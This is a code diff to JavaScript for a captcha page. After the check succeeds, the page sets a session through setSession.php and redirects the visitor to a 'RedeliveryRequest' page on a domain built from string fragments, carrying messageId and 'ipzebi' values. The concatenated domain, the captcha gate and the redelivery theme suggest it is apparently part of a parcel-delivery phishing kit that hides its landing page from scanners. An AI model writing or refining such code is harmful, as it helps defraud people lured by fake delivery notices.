@@ -28,6 +28,8 @@
   }
    let i=0
  
+
+
 function checkInput() {
     var userInput = document.getElementById('userInput').value;
     var randomString = document.getElementById('randomStringSpan').textContent;
@@ -38,24 +40,29 @@ function checkInput() {
 	  let https ="https"
 	  let webapp ="RedeliveryRequest"
 
+    // This part ensures the captcha value is included in the request
+    var dataToSend = "captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi);
+
     if (userInput.toLowerCase() === randomString.toLowerCase()) {
-        // Assuming your AJAX call will be here to set the PHP session
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "session.php", true);
+        xhr.open("POST", "setSession.php", true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhr.onreadystatechange = function() {
             if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
-                // Check response from setSession.php
+                // Parse JSON response from setSession.php
                 var response = JSON.parse(this.responseText);
                 if (response.status === 'success') {
+                    // Success: Proceed with the redirection or next steps
+                    // Adjust the URL as needed for your application
                 	window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
                 } else {
-                    // Handle failure
+                    // Failure: Handle it, maybe show an error message
                     console.error('Session setting failed:', response.message);
+                    errorMsg.textContent = 'Session setup failed. Please try again.';
                 }
             }
         };
-        xhr.send("captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi));
+        xhr.send(dataToSend);
     } else {
         errorMsg.textContent = 'Wrong captcha. Please try again.';
         setTimeout(function() {
